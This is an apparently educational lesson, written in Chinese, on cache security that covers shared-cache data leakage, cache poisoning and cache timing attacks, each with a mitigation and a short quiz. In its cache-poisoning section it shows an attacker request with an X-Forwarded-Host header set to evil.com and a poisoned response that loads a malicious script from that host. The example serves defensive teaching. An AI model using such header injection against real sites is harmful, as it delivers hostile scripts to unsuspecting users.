Koan 21

快取安全

「快取記住一切——包括不該記住的。」

理解

快取帶來速度，但也帶來風險。當快取儲存了敏感資料——個人資訊、認證令牌、私人回應——它可能成為安全漏洞的來源。常見的快取安全威脅包括：共享快取洩漏（使用者 A 看到使用者 B 的資料）、快取中毒（攻擊者注入惡意內容）、以及時序攻擊（透過命中/未命中的回應時間推斷資料存在性）。

問題

使用者 A 登入後，其個人資料被快取。使用者 B 發送相同的請求 URL，快取直接回傳使用者 A 的資料。使用者 B 看到了使用者 A 的姓名、信箱和帳戶餘額。

// 危險：快取鍵只用 URL
cache_key = "/api/profile"

// 安全：快取鍵包含使用者身分
cache_key = "/api/profile:user_id=12345"
解決方案

快取鍵必須包含使用者身分標識。對個人化回應使用 Cache-Control: private，或完全不快取敏感端點。

問題

攻擊者操縱 HTTP 標頭（如 X-Forwarded-Host），使伺服器產生包含惡意 JavaScript 的回應。快取儲存了這個被汙染的回應，並將其提供給所有後續使用者。

// 攻擊者的請求
GET /page HTTP/1.1
X-Forwarded-Host: evil.com

// 伺服器回應（被汙染）
<script src="https://evil.com/malware.js"></script>
解決方案

驗證所有用於產生回應的輸入。使用 Vary 標頭正確區分快取變體。僅快取已驗證的、可信的回應。

問題

攻擊者查詢特定資源：若回應時間極短（~2ms = 命中），代表該資料存在於快取中；若回應較慢（~200ms = 未命中），代表不存在。攻擊者可藉此推斷其他使用者是否存取過特定資料。

~2ms
命中 = 資料存在
~200ms
未命中 = 資料不存在
解決方案

為敏感端點加入隨機延遲，使回應時間恆定。隔離不同使用者的快取命名空間。避免在共享快取中儲存可洩漏存在性的資料。

思考

為什麼快取已認證的回應需要特別小心？
不同使用者可能收到彼此的資料
認證過程太慢，不適合快取
快取不支援認證標頭
洞察
永遠在快取鍵中包含使用者身分標識來處理個人資料。設定適當的 Cache-Control 標頭：private 用於個人回應，no-store 用於敏感資料。考慮對靜態快取資料進行加密保護（encryption at rest）。

記住：快取的速度優勢不能以犧牲使用者安全為代價。
